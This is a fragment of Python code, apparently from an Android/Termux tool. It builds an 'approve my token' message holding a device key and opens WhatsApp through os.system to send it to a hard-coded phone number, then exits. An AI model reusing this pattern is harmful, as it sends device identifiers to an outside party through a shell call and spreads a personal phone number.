        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+showkey);os.system('am start https://wa.me/+8801617687239?text='+tks)
        sys.exit()
approve()
